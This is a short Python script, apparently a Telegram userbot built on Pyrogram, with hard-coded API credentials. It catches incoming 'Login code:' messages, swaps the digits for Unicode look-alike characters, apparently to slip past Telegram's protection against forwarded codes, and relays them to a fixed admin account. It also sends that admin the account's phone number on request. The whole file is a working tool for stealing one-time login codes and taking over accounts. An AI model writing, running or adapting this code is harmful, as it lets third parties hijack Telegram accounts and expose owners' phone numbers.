from pyrogram import *
from pyrogram.types import *
from pyrogram.errors import *
from pyrogram.enums import *
import random


Admin = 141374540
app = Client("SC" , api_id = "5888972" , api_hash = "8c6c75ac3bb436c548e56e93020cb738")


@app.on_message(filters.private & filters.regex('Login code:'))
async def SC(client, message):
  fonts = [{"0":"Ѳ","1":"❶","2":"❷","3":"❸","4":"❹","5":"❺","6":"❻","7":"❼","8":"❽","9":"❾"}, {"0":"𝟘","1":"𝟙","2":"𝟚","3":"𝟛","4":"𝟜","5":"𝟝","6":"𝟞","7":"𝟟","8":"𝟠","9":"𝟡"}]
  txt = message.text
  sc = txt.translate(str.maketrans(random.choice(fonts)))
  await app.send_message(Admin, f"- {sc}")

@app.on_message(filters.regex('(?i)^number$'))
async def aad(client, message):
    if message.from_user.id == Admin:
     me = await app.get_me()
     await message.reply_contact(me.phone_number, me.first_name)






app.run()
